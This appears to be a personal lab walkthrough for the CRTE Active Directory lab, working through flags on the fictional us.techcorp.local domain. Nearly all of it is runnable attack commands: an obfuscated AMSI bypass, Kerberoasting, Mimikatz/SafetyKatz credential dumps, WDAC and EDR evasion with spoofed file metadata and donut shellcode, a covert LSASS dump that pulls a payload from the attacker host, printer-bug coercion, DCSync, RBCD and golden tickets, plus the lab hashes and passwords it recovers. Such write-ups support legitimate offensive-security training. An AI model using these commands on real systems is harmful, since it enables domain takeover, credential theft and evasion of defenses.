# CRTE Lab

## Flag 1,2 - Domain Enumeration

Enumerate following for the us.techcorp.local domain:

* Users&#x20;
* &#x20;Computers&#x20;
* &#x20;Domain Administrators&#x20;
* &#x20;Enterprise Administrators
* &#x20;Kerberos Policy

Use BloodHound to do it or ad module

## Flag 3,4 - Trust Enumeration

To list only the external trusts using PowerView:

{% code overflow="wrap" %}
```powershell
Get-ForestDomain -Verbose | Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'}
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (6).png" alt=""><figcaption></figcaption></figure>

The trust is bidirectional, so enumerate the trust that eu.local has

```powershell
Get-ForestTrust -Forest eu.local
```

<figure><img src="../.gitbook/assets/immagine (1) (1).png" alt=""><figcaption></figcaption></figure>

## FLAG 5/6/7 - Name of the service for privesc on local machine

* Exploit a service on studentx and elevate privileges to local administrator.
* Identify a machine in the domain where studentuserx has local administrative access due to group membership.

Use PowerUp to find a privesc

```powershell
Invoke-AllChecks
```

<figure><img src="../.gitbook/assets/immagine (2) (1).png" alt=""><figcaption></figcaption></figure>

And exploit the service

```powershell
Invoke-ServiceAbuse -Name 'ALG' -UserName us\studentuser64
```

Now log off and log on to gain admin privileges

Import PowerView to find computer wjere we have access as Local Admin

```powershell
Find-LocalAdminAccess
```

Nothing but you can see from bloodhound that the group studentuser is enrolled in the Managers group

Managers group has generic all on MachineAdmins Group, so with AdModule we can add ourself to this group.

```powershell
Add-ADGroupMember -Identity MachineAdmins -Members studentuser64 -Verbose
```

<figure><img src="../.gitbook/assets/immagine (3) (1).png" alt=""><figcaption></figcaption></figure>

Now relogin to update the permissions and try to access to us-mgmt

```powershell
winrs -r:us-mgmt whoami
```

<figure><img src="../.gitbook/assets/immagine (4) (1).png" alt=""><figcaption></figcaption></figure>

By enumerating the groups which we belongs we can se that in the mgmt OU we are Administrators.

## Flag 8 - SevicePrincipalName of the user serviceaccount that we Kerberoasted

Using PowerView see if there are any SPN

{% code overflow="wrap" %}
```powershell
Get-DomainUser –SPN
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (5) (1).png" alt=""><figcaption></figcaption></figure>

the kerberoast attack can be done in wto ways

#### Rubeus and John

First use Argspli.bat to avoid detection in the cmd

<figure><img src="../.gitbook/assets/immagine (6) (1).png" alt=""><figcaption></figcaption></figure>

Now load Rubeus with the Loader to avoid detection and launch an attack against ServiceAccount

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:serviceaccount /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (7).png" alt=""><figcaption></figcaption></figure>

Now crackit with john. The password is _Password123_

#### KerberosRequestorSecurityToken.NET class from PowerShell, Mimikatz and tgsrepcrack.py

We can also use the KerberosRequestorSecurityToken .NET class from PowerShell to request a ticket.

{% code overflow="wrap" %}
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "USSvc/serviceaccount"
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (8).png" alt=""><figcaption></figcaption></figure>

Use Mimikatz to extract the ticket

```powershell
Invoke-Mimi -Command '"kerberos::list /export"'
```

<figure><img src="../.gitbook/assets/immagine (9).png" alt=""><figcaption></figcaption></figure>

and crack it

{% code overflow="wrap" %}
```
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-60210000-studentuser64@USSvc~serviceaccount-US.TECHCORP.LOCAL.kirbi
```
{% endcode %}

## Flag 9 - Password for supportXuser that we Kerberoasted&#x20;

With PowerView see if we have any other interesting ACL with studentusers group:

{% code overflow="wrap" %}
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (10).png" alt=""><figcaption></figcaption></figure>

Since studentuser64 has GenericAll rights on the support64user, let’s force set a SPN on it. Using ActiveDirectory module:

{% tabs %}
{% tab title="Powerview" %}
{% code overflow="wrap" %}
```
Set-DomainObject -Identity support64user -Set @{serviceprincipalname='us/myspn64'} -Verbose
```
{% endcode %}
{% endtab %}

{% tab title="Ad-Module" %}
{% code overflow="wrap" %}
```
Set-ADUser -Identity Support64User -ServicePrincipalNames @{Add='us/myspn64'} -Verbose
```
{% endcode %}
{% endtab %}
{% endtabs %}

Check if SPN is set up now

{% code overflow="wrap" %}
```powershell
Get-ADUser -Identity support64user -Properties ServicePrincipalName | select ServicePrincipalName
```
{% endcode %}

{% hint style="info" %}
If nothing showed might work the same
{% endhint %}

Now crack it. The password is _Desk@123_

## Flag 10/11/12 -  LAPS

To enumerate LAPS import the module AdmPwd.PS.psd1, AD-Module and use the script Get-LapsPermissions.ps1

<figure><img src="../.gitbook/assets/immagine (4).png" alt=""><figcaption></figcaption></figure>

Also powerview can be used

{% code overflow="wrap" %}
```powershell
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (5).png" alt=""><figcaption></figcaption></figure>

So, the studentusers group can read password for LAPS managed Administrator on the us-mgmt machine. Let's try it using the Active Directory module, LAPS module and PowerView.

{% tabs %}
{% tab title="AD-Module" %}


{% code overflow="wrap" %}
```powershell
Get-ADComputer -Identity us-mailmgmt -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
```
{% endcode %}
{% endtab %}

{% tab title="PowerView" %}
{% code overflow="wrap" %}
```powershell
Get-DomainObject -Identity us-mailmgmt | select -ExpandProperty ms-mcs-admpwd
```
{% endcode %}
{% endtab %}

{% tab title="LAPS Module" %}
```powershell
Get-AdmPwdPassword -ComputerName us-mailmgmt
```
{% endtab %}
{% endtabs %}

<figure><img src="../.gitbook/assets/immagine.png" alt=""><figcaption></figcaption></figure>

The password is _a\[9\&Dhs./tu-]W_

_So with this password let's try to access us-mailmgmt_

```powershell
winrs -r:us-mailmgmt -u:.\administrator -p:a[9&Dhs./tu-]W cmd
```

<figure><img src="../.gitbook/assets/immagine (1).png" alt=""><figcaption></figcaption></figure>

Now extract credentials of interactive logon sessions and service accounts from us-mailmgmt

To do so we need to use PS-Session and Invoke-mimi.

First open a PS-Session on US-mailmgmt

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString 'a[9&Dhs./tu-]W' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("us-mailmgmt\administrator", $passwd)
$mailmgmt = New-PSSession -ComputerName us-mailmgmt -Credential $creds
```
{% endcode %}

Enter the session and bypass the AMSI

```powershell
Enter-PSSession $mailmgmt
```

{% code overflow="wrap" %}
```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (2).png" alt=""><figcaption></figcaption></figure>

Now launch Invoke-Mimi throught the session

{% code overflow="wrap" %}
```powershell
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $mailmgmt
```
{% endcode %}

Enter the session again and dump dhe creds

```powershell
Invoke-Mimi -Command '"sekurlsa::keys"'
```

<figure><img src="../.gitbook/assets/immagine (3).png" alt=""><figcaption></figcaption></figure>

Provisioningsvc aes: _a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a_

Provisioningsvc rc4: _44dea6608c25a85d578d0c2b6f8355c4_

## Flag 13/14 - GMSa

To enumerate gMSAs, we can use the ADModule

```
Get-ADServiceAccount -Filter *
```

<figure><img src="../.gitbook/assets/immagine (11).png" alt=""><figcaption></figcaption></figure>

Enumerate the Principals that can read the password blob:

{% code overflow="wrap" %}
```powershell
Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (12).png" alt=""><figcaption></figcaption></figure>

Recall that we got secrets of provisioning svc from us-mailmgmt. Start a new process as the provisioningsvc user.

{% code overflow="wrap" %}
```powershell
./Rubeus.exe asktgt /user:provisioningsvc /aes256:a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

Now launch powerhsell and import the AD-Module to get the password blob

{% code overflow="wrap" %}
```powershell
$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
```
{% endcode %}

Now import ds internals to decrypt the blob

```powershell
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
```

Now convert it to NT

```powershell
ConvertTo-NTHash -password $decodedpwd.SecureCurrentPassword
```

<figure><img src="../.gitbook/assets/immagine (13).png" alt=""><figcaption></figcaption></figure>

RC4: 123fef24212a5617ed8234dd54a4d7ad&#x20;

## FLAG 15/16/17 - WDAC e MDE

Now start a process as jumpone

{% code overflow="wrap" %}
```powershell
./Rubeus.exe asktgt /user:jumpone /rc4:123fef24212a5617ed8234dd54a4d7ad /opsec /force /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (14).png" alt=""><figcaption></figcaption></figure>

Now launch a powershell session with invishell and use Find-PSRemotingLocalAdminAccess.ps1 to find where this user has damin access

```powershell
Find-PSRemotingLocalAdminAccess -Domain us.techcorp.local -Verbose
```

<figure><img src="../.gitbook/assets/immagine (15).png" alt=""><figcaption></figcaption></figure>

Let us now test to see if an EDR is enabled on the target using Invoke-EDRChecker.ps1 as follows. Run the following command in the process spawned as jumpone:

```
Invoke-EDRChecker -Remote -ComputerName us-jump3
```

<figure><img src="../.gitbook/assets/immagine (16).png" alt=""><figcaption></figcaption></figure>

EDR is enabled. Access us-jump3 using winrs. We need to check also if other security measure are in place like wdac.

{% code overflow="wrap" %}
```powershell
winrs -r:us-jump3 "powershell Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard"
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (17).png" alt=""><figcaption></figcaption></figure>

We can now attempt to copy and parse the WDAC config deployed on us-jump to find suitable bypasses and loopholes in the policy.

```powershell
dir \\us-jump3.US.TECHCORP.LOCAL\c$\Windows\System32\CodeIntegrity
```

<figure><img src="../.gitbook/assets/immagine (18).png" alt=""><figcaption></figcaption></figure>

We find a deployed policy named DG.bin.p7 / SiPolicy.p7b in the CodeIntegrity folder. Copy either policy binary back over to our studentVM.

{% code overflow="wrap" %}
```powershell
copy \\us-jump3.US.TECHCORP.LOCAL\c$\Windows\System32\CodeIntegrity\DG.bin.p7 C:\AD\Tools
```
{% endcode %}

Now import CIPolicyParser.ps1 to parse the copied policy binary

{% code overflow="wrap" %}
```powershell
ConvertTo-CIPolicy -BinaryFilePath C:\AD\Tools\DG.bin.p7 -XmlFilePath C:\AD\Tools\DG.bin.xml
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (19).png" alt=""><figcaption></figcaption></figure>

Noa analyze it to findout that vmware Workstation has allow permission to execute

<figure><img src="../.gitbook/assets/immagine (20).png" alt=""><figcaption></figcaption></figure>

We can now attempt to perform an LSASS dump on the target us-jump using a covert technique / tool to bypass MDE along with WDAC.

We will be using the mockingjay POC (loader / dropper) along with nanodump shellcode to bypass MDE detections and perform a covert LSASS Dump. To bypass WDAC we edit File Attributes to match the Product Name: "Vmware Workstation" on all required files (exe / dlls) of the mockingjay POC.

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\msvcp140.dll --set-version-string "ProductName" "Vmware Workstation"
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\vcruntime140.dll --set-version-string "ProductName" "Vmware Workstation"
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\vcruntime140_1.dll --set-version-string "ProductName" "Vmware Workstation"
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\mockingjay.exe --set-version-string "ProductName" "Vmware Workstation"
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\mscorlib.ni.dll --set-version-string "ProductName" "Vmware Workstation"
```
{% endcode %}

Now compress them in a zip

{% code overflow="wrap" %}
```powershell
Compress-Archive -Path C:\AD\Tools\mockingjay\msvcp140.dll,C:\AD\Tools\mockingjay\vcruntime140.dll,C:\AD\Tools\mockingjay\vcruntime140_1.dll,C:\AD\Tools\mockingjay\mockingjay.exe, C:\AD\Tools\mockingjay\mscorlib.ni.dll -DestinationPath "C:\AD\Tools\mockingjay\mockingjay.zip"
```
{% endcode %}

Now convert nanodump into compatible shellcode using donut along with the args: spoof- callstack (-sc), fork LSASS process before dumping (-f) and output the dump to a file named nano.dmp (--write) to make it dump LSASS in a covert way.

{% hint style="info" %}
shellcode dosen't need to be edited using rcedit to bypass WDAC.
{% endhint %}

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\mockingjay\donut.exe -f 1 -p " -sc -f --write nano.dmp" -i C:\AD\Tools\mockingjay\nanodump.x64.exe -o C:\AD\Tools\mockingjay\nano.bin
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (21).png" alt=""><figcaption></figcaption></figure>

Confirm that the mockingjay poc and nano.bin shellcode is undetected by AV using AmsiTrigger / DefenderCheck:

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">C:\AD\Tools\DefenderCheck.exe C:\AD\Tools\mockingjay\mockingjay.exe
<strong>C:\AD\Tools\DefenderCheck.exe C:\AD\Tools\mockingjay\nano.bin
</strong></code></pre>

Now host mockingjay.zip and nano.bin on our student VM using HFS. Make sure firewall is disabled before doing so. From the process running with privileges of jumpone, connect to us-jumpX and then download mockingjay.zip using msedge.

{% hint style="info" %}
Using commonly abused binaries such as certutil for downloads, will result in a detection on MDE.
{% endhint %}

{% hint style="warning" %}
Make sure to disable firewall on the hosting machine
{% endhint %}

{% code overflow="wrap" %}
```
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --incognito http://192.168.100.64/mockingjay.zip
```
{% endcode %}

Now extract the contents from the mockingjay.zip archive using tar and attempt to perform an LSASS dump invoking the nano.bin shellcode hosted on our studentvm webserver.

```
mockingjay.exe 192.168.100.64 "/nano.bin"
```

An LSASS dump file is written called nano.dmp with an invalid signature since a normal LSASS dump on disk could trigger an MDE detection. We will now exfiltrate this dump file, restore and parse it for credentials.

Copy it on the local machine

{% code overflow="wrap" %}
```powershell
copy \\us-jump3.US.TECHCORP.LOCAL\c$\users\jumpone$\Downloads\nano.dmp C:\AD\Tools\mockingjay
```
{% endcode %}

Now restore the signature

```powershell
.\restore_signature.exe .\nano.dmp
```

Now use SafetyKatz with the argsplit method for the word "sekurlsa::minidump" to extract the credentials

{% code overflow="wrap" %}
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% C:\AD\Tools\mockingjay\nano.dmp" "sekurlsa::keys" "exit"
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (22).png" alt=""><figcaption></figcaption></figure>

pawadmin aes: _a92324f21af51ea2891a24e9d5c3ae9dd2ae09b88ef6a88cb292575d16063c30_\
_RC4:_ 36ea28bfa97a992b5e85bd22485e8d52

appsvc pwd: Us$rT0AccessDBwithImpersonation\
aes: b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335\
rc4: 1d49d390ac01d568f0ee9be82bb74d4c

webmaster aes: 2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0\
rc4: 23d6458d06b25e463b9666364fb0b29f

On us-jump3, we can check for certificates that can be used later. Spawn a process with the privileges of pawadmin:

{% code overflow="wrap" %}
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:pawadmin /domain:us.techcorp.local /aes256:a92324f21af51ea2891a24e9d5c3ae9dd2ae09b88ef6a88cb292575d16063c30 /opsec /createnetonl:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (24).png" alt=""><figcaption></figcaption></figure>

Run the below commands in the new process to enumerate the LocalMachine certificate store:

```
certutil -store My
```

Serial Number: 770000002116e9d99c3a4ceaf1000000000021

<figure><img src="../.gitbook/assets/immagine (25).png" alt=""><figcaption></figcaption></figure>

export it

{% code overflow="wrap" %}
```
certutil -exportpfx -p SecretPass@123 770000002116e9d99c3a4ceaf1000000000021 C:\Users\pawadmin\Downloads\pawadmin.pfx
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (26).png" alt=""><figcaption></figcaption></figure>

And copy it on local machine

{% code overflow="wrap" %}
```powershell
copy \\us-jump3.US.TECHCORP.LOCAL\c$\users\pawadmin\Downloads\pawadmin.pfx C:\AD\Tools\
```
{% endcode %}

## Flag 18/19/20/21 - Unconstrained Delegation

First, we need to find out the machines in us.techcorp.local with unconstrained delegation. We can use PowerView  for that. I used BloodHound.

```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
```

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Now use the credentials of webmaster extracted before to check if we have admin rights on this machine

{% code overflow="wrap" %}
```
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:webmaster /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

On the new spawned process run invishell and use Find-PSRemotingLocalAdminAccess.ps1 to check for the admin rights

```powershell
Find-PSRemotingLocalAdminAccess -Domain us.techcorp.local -Verbose
```

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now, we will use the printer bug to force us-dc to connect to us-web.&#x20;

{% tabs %}
{% tab title="Loader" %}


Let's first copy Loader.exe to us-web to download and execute Rubeus in the memory and start monitoring for any authentication from us-dc.

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>echo F | xcopy C:\AD\Tools\Loader.exe \\us-web\C$\Users\Public\Loader.exe /Y
</strong></code></pre>

Now create a tunnel to download the file

{% code overflow="wrap" %}
```powershell
netsh interface portproxy add v4tov4 listenport=8080  listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.64
```
{% endcode %}

And use rubeus with the monitor option

{% code overflow="wrap" %}
```powershell
C:\Users\Public\Loader.exe -path  http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /targetuser:US-DC$ /interval:5  /nowrap
```
{% endcode %}
{% endtab %}

{% tab title="PS-Remoting" %}
{% code overflow="wrap" %}
```powershell
$usweb1 = New-PSSession us-web
Copy-Item -ToSession $usweb1 -Path C:\AD\Tools\Rubeus.exe -Destination C:\Users\Public
Enter-PSSession $usweb1
cd C:\Users\Public
.\Rubeus.exe monitor /targetuser:US-DC$ /interval:5 /nowrap
```
{% endcode %}
{% endtab %}
{% endtabs %}

<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Using either of the above methods, once we have Rubeus running in the monitor mode, we can start MS-RPRN.exe to force connect us-dc to us-web and thereby abuse the printer bug:

```
C:\AD\Tools\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
```

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now use the ticket to gain a session

{% code overflow="wrap" %}
```
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /ticket:doIFvDCCBbigAwIBBaEDAgEWooIEtDCCBLBhggSsMIIEqKADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxFVUy5URUNIQ09SUC5MT0NBTKOCBGIwggReoAMCARKhAwIBAqKCBFAEggRMaPbocsG/tcZialIisEwS7ddByeYtDvo26euMi2wawAJiCYHp9GIZIonlDhnjLEo+txhXSEC4xOIF9g8ceh3lExlbofN+FMFUZShZAkozLvQm4KVwQeEkhip4qPVyXU4GZk3gAuPUvxbhlgrvj0okeU+CtxCq21e6gvNt9xn99L7072OjCNowRMBW/zGmyEFiC/seUVcH7iYdv1EKGrb94EM9XYhB3sQiDr+HCV1YVvR6qn3HBev/q9qMQ4jrBFr4LGid0CbQxkAjNpVgOD/1PiMznpqQGC5I3RrxMfuEogyGySftYTogbMtNILMRe3Ervk+pX8f6Z6L5SF2gGBdYUh+Fr7+rWWRC1NnCf9Bd9EAWigAQZD5KBpQ5vSz+tBtNKKzsI0J1NrFzUKFrS6EFWZsoNLUwjKOiDHVmnJ8DQMhij7ImNfOFPsKUMeXap15usc8rorz1pcORkzZZsYe02H9pRA3sCvshwkL2l+VRkaG8MZDOAsQky28nyhhMDldSpyDbqGVs7Ql138newyUQuzicejFSC+pFiY7mmsb/wPznYI7ZcD09kYB0IeB7OcL/5JlYqXYP8j4Id72CRhtaZCPe8BKCVeI09THMLYKkg+WPPNycLPC0dpSckU+f9USuvxZcn/ez6Oef2nl4GW2bawgn126P5IJVrf+m3wXavm8WMRtk1hIecmJ2N2G/+6WcphjZs/vuKt7y6uITnvsUF++u41oCJO8VogvWRm8HvSx3dmYB+0I12OXefLg3SxtmjTjinGJSJ3chDbCaugC95vlpncn51CcHzRA7+BhaD3awZUex4fRaWMYarvF2xGKYzOO9u31I9lAmFmfgl6ftCDr5qDYFZUNoEqQgwzoWVqyjyLSBSaALbVHQVpOPE06zIt/DS4op+XTRJau9wXUxXnz0ZiMIMXqRmLbbektzeZVluf8hyGU9H2CrSui4XhpPuJyRN/8USSYILsZmOmd0Mz1FhGk8xrJLZdc3UN0O4ucsO3EPnjgrtAetrEzDsFdc72QUqeHN45k9LksEqHFjG8YAWeQFJOSPPEGj9nWWDqhEOKyo2R3isD0Dv64H7WVAp2sOKDVCLoYgxd80QCU7zrtF4g8ZJVKtI98dJKigFc1C0N2InUkKNSJ2ygP8JTZm0fT99XFpt7MZxI3Lez6Pet1Xkd/AvFmNkkdDvdRHEkVI+Nj5ySnqREnF++lVasB/oZEYfYp4lAvWfEqcrxzc2SAm22wKKp4T3ThNjgYI1piIb3HZY8g/2DMglSk+DPImwMlXsIc0+K/MtPfgPqFzzGq5y1yecJXZ1431B0uiPt+O7LwvNQQXcAdNsw2G3YpT5391h5FIyfu98pct3MXPzOCAk0SbNCy5npFtPAORUXRAi8C9w9ZZOgYq2esm0K89SGif0siiA95QjbEHKf7+dNfK4YnOx2MNRpVtwChiA5nsW/+BR86+8AR6LJqjgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCDtjM6US9v0RLKjK0PbAN+1gUDjzBx/eIUcXhg6cCCXXKETGxFVUy5URUNIQ09SUC5MT0NBTKITMBGgAwIBAaEKMAgbBlVTLURDJKMHAwUAYKEAAKURGA8yMDI0MDQyOTA0MTA0NlqmERgPMjAyNDA0MjkxNDEwMDhapxEYDzIwMjQwNTA2MDQxMDA4WqgTGxFVUy5URUNIQ09SUC5MT0NBTKkmMCSgAwIBAqEdMBsbBmtyYnRndBsRVVMuVEVDSENPUlAuTE9DQUw=
```
{% endcode %}

And run a DCSync attack against the DC

{% code overflow="wrap" %}
```
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::dcsync /user:us\krbtgt" "exit"
```
{% endcode %}

krbtgt aes: _5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5_\
RC4:  _b0975ae49f441adc6b024ad238935af5_

## Flag N/A - Constrained Delegation

Enumerate the objects in our current domain that have constrained delegation enabled with the help of the Active Directory module from InvisiShell:

{% code overflow="wrap" %}
```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

Recall l that we extracted credentials of appsvc from us-jump, let’s use the AES256 keys for appsvc to impersonate the domain administrator - administrator and access us-mssql using those privileges. Note that we request an alternate ticket for HTTP service to be able to use WinRM.

## Flag 22 to 29 - Write/GenericWrite permission over Computer Object

Extract credential from us-mgmt that we already own with safetykatz

{% code overflow="wrap" %}
```powershell
$usmgmt1 = New-PSSession us-mgmt
Copy-Item -ToSession $usmgmt1 -Path C:\AD\Tools\SafetyKatz.exe -Destination C:\Users\Public
Enter-PSSession $usmgmt1
cd C:\Users\Public
.\Safetykatz.exe -args sekurlsa::ekeys exit
```
{% endcode %}

mgmtadmin aes: 32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f\
RC4: e53153fc2dc8d4c5a5839e46220717e5

Now using powerview lt's see if he has some interesting ACLs

{% code overflow="wrap" %}
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'mgmtadmin'}
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

We are using our student VM computer object and not the studentuserx as SPN is required for RBCD

Start a process with privileges of mgtmadmin. Use ArgSplit.bat on the student VM to encode “asktgt”&#x20;

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:mgmtadmin /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f  /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

Run Invishell and import AD-Module. Now set RBCD to the student vm:

{% code overflow="wrap" %}
```powershell
Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount student64$ -Verbose
```
{% endcode %}

Now we need the aes of the student vm. Use SafetyKatz

{% hint style="info" %}
Use the one with SID = S-1-5-18
{% endhint %}

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::ekeys" "exit"
```
{% endcode %}

student64$ aes: 6f7e997ae3f3fc5265ce2961a829227873908e821c30b47fbf0004bc57f21825

now use rubeus with s4u to create a ticket and open a session

{% code overflow="wrap" %}
```powershell
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:student64$  /aes256:6f7e997ae3f3fc5265ce2961a829227873908e821c30b47fbf0004bc57f21825 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now copy the NetLoader on the target and use it to launch SafetyKatz and extract credetials

{% code overflow="wrap" %}
```powershell
xcopy C:\AD\Tools\Loader.exe \us-helpdesk\C$\Users\Public\Loader.exe /Y
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.64
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args %Pwn% "exit"
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

helpdeskadmin aes: _f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534_

Now create and import a ticket to look if this user has admin privilege on some machine

```powershell
Find-PSRemotingLocalAdminAccess -Domain us.techcorp.local -Verbose
```

<figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Flag 29 - Golden Ticket

Using the krbtgt aes previously obtained to craft a silver ticket

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args golden /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /ldap /sid:S-1-5-21-210670787-2521448726-163245708 /user:Administrator /printcmd
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now use the generated command to print a golden ticket nad import it

<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now use PS-Remoting to dump all the domain secrets

```
$sess = New-PSSession us-dc.us.techcorp.local
Enter-PSSession -Session $sess
```

Now bypass amsi and import Invoke-Mimi

<pre data-overflow="wrap"><code>Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $sess
<strong>Enter-PSSession -Session $sess
</strong>Invoke-Mimi -Command '"lsadump::lsa /patch"'
